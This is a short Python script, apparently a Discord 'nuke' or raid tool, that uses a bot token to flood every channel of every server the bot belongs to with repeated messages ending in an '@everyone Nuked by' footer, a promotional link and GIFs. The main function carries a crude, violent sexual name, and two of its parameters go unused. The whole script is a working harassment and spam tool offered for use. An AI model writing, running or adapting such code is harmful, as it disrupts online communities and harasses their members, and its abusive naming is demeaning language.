import requests

Footer = ("@everyone Nuked by http://dsc.gg/reaperxyz "
          "https://media.discordapp.net/attachments/1227299397142970369/1228750697185677454/513ad497-bd26-48d2-9f80-fe5c8c5209cd.gif?ex=662d2e43&is=661ab943&hm=7af13f40be039a942c2f2bd0c080960b61fbf8181f742be0084430f85b7bc4ca&= "
          "https://media.discordapp.net/attachments/1227299397142970369/1228749619584962682/deadbolt-indie-game.gif?ex=662d2d42&is=661ab842&hm=0627e082b2cc31f59487e7829d1c0b3bf476c89cffc67c718e452ebed776a33a&= "
          "https://media.discordapp.net/attachments/1227299397142970369/1228751069140615269/1bbbf01b-74b7-414a-b565-6705e55f191f.gif?ex=662d2e9b&is=661ab99b&hm=68fcd92f0a99be509c2bb95f5ea28198d163cd3399f5ae1cccb786f43a4ccf6a&=")

def send_message(token, channel_id, message, footer):
    headers = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json',
    }
    data = {
        'content': f"{message}\n{footer}"
    }
    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
    if response.status_code == 200:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")

def rape_servers(token, message, amount, new_username, pfp_url):

    headers = {
        'Authorization': f'Bot {token}',
    }
    for guild in requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json():
        for channel in requests.get(f'https://discord.com/api/v9/guilds/{guild["id"]}/channels', headers=headers).json():
            try:
                for _ in range(amount):
                    send_message(token, channel['id'], message, Footer)
            except Exception as e:
                print(f"Failed to send message to guild {guild['name']} channel {channel['name']}: {e}")
